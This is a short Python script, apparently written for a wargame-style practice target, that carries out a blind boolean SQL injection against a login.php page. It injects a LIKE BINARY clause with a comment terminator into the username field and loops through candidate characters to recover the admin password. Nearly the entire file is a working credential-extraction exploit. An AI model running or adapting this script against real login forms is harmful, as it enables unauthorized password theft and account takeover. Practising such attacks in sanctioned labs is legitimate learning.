#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# client.py

'''
The server gives us binary feedback. We can use SQL injection to deduce the 
password.

    Query: SELECT * FROM users WHERE username='' AND password=''

    Objective: Retrieve the admin's password.

See natas15 of the overthewire wargames for an example of this type of SQL 
attack.
'''


import urllib.request, urllib.parse
from string import ascii_lowercase, ascii_uppercase, digits


user = 'admin'
domain = 'http://vulnserver-failedxyz.c9.io/'
fragment = user + "' AND password LIKE BINARY '{}%' -- " # For username field
possible_chars = ascii_lowercase + ascii_uppercase + digits + '_'
password = ''

print("Trying to get {}'s password . . . ".format(user))
while True:
    for char in possible_chars:
        print('Trying "{}" . . . '.format(char))
        injection = fragment.format(password + char)
        parameters = urllib.parse.urlencode({
            'username' : injection, 
            'password' : ''
        })
        
        # The data are part of a GET, not POST, request
        # Why u no POST or HTTPS?
        url = domain + 'login.php?' + parameters
        response = urllib.request.urlopen(url)
        source = response.read().decode('utf-8')
        if 'Nope' not in source:
            password += char
            print('Updated password: "{}"'.format(password))
            break
    
    else:
        print('No more characters found.')
        print('"{}" password: "{}"'.format(user, password))
        break
